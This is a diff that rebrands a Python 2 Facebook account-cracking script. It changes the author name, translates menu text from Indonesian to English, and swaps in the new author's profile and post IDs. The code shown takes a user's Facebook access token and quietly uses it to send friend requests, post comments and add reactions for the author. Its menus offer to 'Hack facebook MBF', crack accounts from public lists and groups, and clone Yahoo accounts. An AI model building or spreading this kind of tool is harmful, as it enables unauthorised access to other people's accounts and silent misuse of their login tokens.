@@ -66,7 +66,7 @@ logo = """
 ██║░░██╗██╔══██╗███████║██║░░██╗██╔═██╗░
 ╚█████╔╝██║░░██║╚════██║╚█████╔╝██║░╚██╗
 ░╚════╝░╚═╝░░╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝
-\033[1;41;97mAuthor : KARMA DAVID\033[0m
+\033[1;41;97mAuthor : ONYEDIKACHI OKORO\033[0m
  """
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -91,8 +91,8 @@ def masuk():
 	os.system('clear')
 	print logo
 	print "\033[1;97m ╔                                     ╗"
-	print "\033[1;97m  [\033[1;97m01\033[1;97m]\033[1;96m\033[1;97m Login Menggunakan Token Facebook"
-	print "\033[1;97m  [\033[1;91m00\033[1;97m]\033[1;96m\033[1;97m Keluar"
+	print "\033[1;97m  [\033[1;97m01\033[1;97m]\033[1;96m\033[1;97m Login Facebook Token"
+	print "\033[1;97m  [\033[1;91m00\033[1;97m]\033[1;96m\033[1;97m Exit"
 	print "\033[1;97m ╚                                     ╝"
 	pilih_masuk()
 
@@ -123,10 +123,10 @@ def tokenz():
 		zedd.close()
 		jalan ('\033[1;97mYou MUST FOLLOW ME FB ALC TO WORK SUCCEEFUL :) ')
 		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Alhamdulillah'
-		os.system('xdg-open  https://www.facebook.com/onyemai')
+		os.system('xdg-open  https://www.facebook.com/Corneliuschinedumsunday1')
 		bot_komen()
 	except KeyError:
-		print "\033[1;97m[\033[1;39m!\033[1;97m] \033[1;39mToken Salah !"
+		print "\033[1;97m[\033[1;39m!\033[1;97m] \033[1;39mToken Error !"
 		time.sleep(1)
 		masuk()
 
@@ -137,12 +137,12 @@ def bot_komen():
 	except IOError:
 		print"\033[1;39m[!] Token invalid"
 		os.system('rm -rf login.txt')
-	una = ('100047165779215')
-	kom = ('Assalamualaikum😊')
+	una = ('100004412526309')
+	kom = ('Good day😊')
 	reac = ('LOVE')
-	post = ('213235326925325')
-	post2 = ('209016570680534')
-	kom2 = ('Izin Pakai script lu bang🙏')
+	post = ('1874741336016266')
+	post2 = ('1874741336016266')
+	kom2 = ('Please send me this script🙏')
 	reac2 = ('ANGRY')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
@@ -181,7 +181,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
 	print "\x1b[1;93m1.\x1b[1;93m Hack facebook MBF"
-	print "\x1b[1;93m2.\x1b[1;93m View Lost Of Groups              "
+	print "\x1b[1;93m2.\x1b[1;93m View List Of Groups              "
 	print "\x1b[1;93m3.\x1b[1;93m Account Information              "
 	print "\x1b[1;93m4.\x1b[1;93m Yahoo clone               "
 	print "\n\x1b[1;91m0.\x1b[1;91m Logout            "
@@ -228,7 +228,7 @@ def super():
 	print "\x1b[1;97m2.\x1b[1;93m Crack Public List"
 	print "\x1b[1;97m3.\x1b[1;93m Crack From Group Member"
 	print "\x1b[1;97m4.\x1b[1;93m Crack From file"
-	print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
+	print "\n\x1b[1;91m0.\x1b[1;91m Exit"
 	pilih_super()
 
 def pilih_super():
